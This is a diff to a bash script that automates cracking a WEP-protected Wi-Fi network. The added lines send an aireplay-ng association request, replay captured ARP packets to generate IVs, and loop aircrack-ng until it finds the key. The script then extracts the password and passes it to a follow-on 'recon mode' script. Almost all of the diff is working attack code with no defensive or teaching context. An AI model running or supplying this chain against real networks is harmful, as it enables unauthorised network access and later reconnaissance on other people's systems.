@@ -9,8 +9,7 @@ while true; do
 	echo $PWR
 	sleep .2
 	if (($PWR >= $2)); then
-		echo "[*] Threshold reached, killing airodump-ng"
-		sudo kill -9 $(ps -aux | grep -v grep | grep -v sudo | grep -m1 airodump | awk -F' ' '{print $2}')
+		echo "[*] Power signal threshold reached"
 		sleep 5
 		clear
 		echo "[*] Launching attack on network"
@@ -24,6 +23,34 @@ wlanMAC="$(cat /sys/class/net/wlan1mon/address)"
 BSSID="$3"
 CHANNEL="$4"
 
-aireplay-ng -1 0 -e $SSID -a $BSSID -h $wlanMAC wlan1mon
+./redLED.py &
 
+#This command sends an association request
+aireplay-ng -1 0 -a $BSSID -h $wlanMAC wlan1mon
+
+#This captures an ARP packet and replays it in order to generate IVs
+aireplay-ng -3 -b $BSSID -h $wlanMAC wlan1mon &
+
+#Start brute force cracker on data capture file
+while true; do
+	sleep 120
+	aircrack-ng -q -b $BSSID capFiles/psk-01.cap > capFiles/key.txt &
+	sleep 90
+	if grep "KEY FOUND" capFiles/key.txt
+	then
+		break
+	else
+		sudo kill $(ps -aux | grep -m 1 aircrack | awk -F' ' '{print $2}')
+		sleep 10
+		aircrack-ng -q -b $BSSID capFiles/psk-01.cap > capFiles/key.txt &
+	fi
+done
+
+#Key found
+
+pass="$(cat capFiles/key.txt | grep -m 1 ASCII | awk -F' ' '{print $7}')"
+
+#Start recon mode
+
+./../reconMode/reUp.sh "$SSID" "$pass"
 
